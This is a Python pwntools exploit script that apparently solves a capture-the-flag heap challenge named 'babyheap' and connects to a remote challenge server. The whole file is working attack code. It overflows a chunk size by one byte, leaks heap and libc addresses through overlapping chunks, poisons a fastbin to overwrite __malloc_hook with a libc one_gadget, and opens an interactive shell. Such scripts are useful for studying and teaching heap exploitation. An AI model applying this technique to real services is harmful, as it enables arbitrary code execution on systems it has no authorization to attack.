#! /usr/bin/env python
# -*- coding: utf-8 -*-
# made by moonAgirl
from pwn import *
LOCAL = 0
if LOCAL:
    os.environ["LD_LIBRARY_PATH"]="/home/moonagirl/moonagirl/libc/libc_local_x64"
    mylibc = ELF("/home/moonagirl/moonagirl/libc/libc_local_x64")
    gadget=[0xf1117,0xf0274,0x4526a,0x45216] #libc2.23
#    context.log_level = 'debug'
    io = process('./babyheap')#,env={"LD_PRELOAD":"./libc-2.24.so"})
#    __malloc_hook+68
    
else:
    mylibc = ELF("/home/moonagirl/moonagirl/ida/libc-2.24.so")
    gadget=[0x3f306,0x3f35a,0xd695f] #libc2.24
    #main_arena_off = 0x3c4b78
    #io = remote("47.90.103.10", 6000)
    io = remote("202.120.7.204",127)#202.120.7.204:127

def z(a=''):
    gdb.attach(io,a)
    if a == '':
        raw_input()

def Allocate(size):
    io.sendlineafter("Command: ","1")
    io.sendlineafter("Size: ",str(size))

def Update(index,size,content):
    io.sendlineafter("Command: ","2")
    io.sendlineafter("Index: ",str(index))
    io.sendlineafter("Size: ",str(size))
    io.sendlineafter("Content: ",content)

def Delete(index):
    io.sendlineafter("Command: ","3")
    io.sendlineafter("Index: ",str(index))

def View(index):
    io.sendlineafter("Command: ","4")
    io.sendlineafter("Index: ",str(index))

def pwnit():
    Allocate(0x18)#0
    Allocate(0x18)#1
    Allocate(0x18)#2
    Allocate(0x18)#3

    Update(0,25,'a'*24+'\x41')
    Delete(1)
    Allocate(0x30)#1

    Update(1,32,p64(0)*3+p64(0x21))
 #   io.interactive()
    Delete(3)
    Delete(2)

    Update(1,32,'A'*32)
    View(1)
    data = io.recvline()
    heap = u64(data[42:48].ljust(8,'\x00'))
    success('heap:'+hex(heap))
    Update(1,32,p64(0)*3+p64(0x21))
    Allocate(0x18)#2
    Allocate(0x18)#3

    Allocate(0x18)#4
    Allocate(0x18)#5
    Allocate(0x18)#6
    Allocate(0x58)#7
    Allocate(0x30)#8
    Allocate(0x50)#9

    Update(4,25,'a'*24+'\x41')
    Delete(5)
    Allocate(0x30)#1
    Update(5,32,p64(0)*3+p64(0xC1))
    Delete(6)
    Update(5,32,'A'*32)
#    io.interactive()
    View(5)
    data = io.recvline()
    libc = u64(data[42:48].ljust(8,'\x00'))
    success('heap:'+hex(libc))
    libc_base = libc + 0x10 - mylibc.symbols['__malloc_hook'] - 0x78
    success('libc_base:'+hex(libc_base))
    
    success('__malloc_hook:'+hex(mylibc.symbols['__malloc_hook']+libc_base))
    Update(5,32,p64(0)*3+p64(0x20))

    Allocate(0x18)#6

    Allocate(0x28)#10
    Allocate(0x28)#11
    Allocate(0x28)#12
    Allocate(0x28)#13
    Update(10,0x29,p64(0)*5+'\x61')
    Delete(11)
#    z()
    Allocate(0x58)#11
#    z()
    Update(11,56,p64(0)*5+p64(0x61)+p64(0x40))
    Delete(12)
    Update(11,56,p64(0)*5+p64(0x61)+p64(0x40))
    Allocate(0x58)#12
#    z()


    Update(1,32,p64(0)*3+p64(0x41))
    Delete(2)
 #   z()
    Update(1,40,p64(0)*3+p64(0x41)+p64(mylibc.symbols['__malloc_hook']+libc_base+0x30))
    Allocate(0x30)#2
#    z()
    Allocate(0x30)#14
 #   z()
 #   z()
    Update(14,0x30,p64(0)*5 + p64(mylibc.symbols['__malloc_hook']+libc_base-0x10))
    Allocate(0x40)#15
#    io.interactive()
#    Delete(12)
#    z()
#    
    
    one_gadget = gadget[1]+libc_base
    success('one_gadget:'+hex(one_gadget))
    Update(15,16,p64(one_gadget)*2)
    Delete(0)
 #   z()

    Allocate(0x18)#10
    io.interactive()
    

if __name__ == "__main__":
    pwnit()
